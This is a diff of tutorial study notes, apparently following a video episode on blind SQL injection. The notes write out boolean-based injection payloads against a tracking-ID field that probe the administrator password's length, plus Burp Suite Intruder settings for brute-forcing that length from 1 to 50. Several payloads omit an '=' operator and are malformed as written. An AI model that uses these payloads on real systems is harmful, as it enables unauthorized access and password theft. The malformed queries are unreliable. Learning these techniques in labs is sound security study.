@@ -82,9 +82,9 @@ Episode11- YouTube Channel AcronProject:
         |   11-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator')='administrator'--'
         |   12-1 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select Password from users where username'administrator')='Password'--'
         |                                                                                                                                                       = How ?
-        |   12-2 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>1)='administrator'--' == ? True/False 
-        |   12-3 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>2)='administrator'--' == ? True/False
-        |                                                                                                                                                                                              . . . . == False                      
+        |   12-2 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>1)='administrator'--' = True/False? 
+        |   12-3 select tracking-id from tracking-table where trackingId = 'asDAWF2$DSGX!123!EXV' and (select username from users where username'administrator' and LENGTH(Password)>50)='administrator'--'= True/False?
+        |                                                                                                                                                                                             .... = if it's False                      
         13- Go with Intruder BurpSuite:
         |   13-1 click ---> Clear $
         |   13-2 Highlight 1 on this query:
@@ -94,8 +94,9 @@ Episode11- YouTube Channel AcronProject:
         |   13-5 go to Paloads Tab
         |   13-6 Click Payload type = Numers 
         |   13-7 on Paload Options ---> Number range ---> Type = Sequential
-        | 
-
+        |   13-8 From = 1 
+        |   13-9 To = 50 
+        
 
 
 
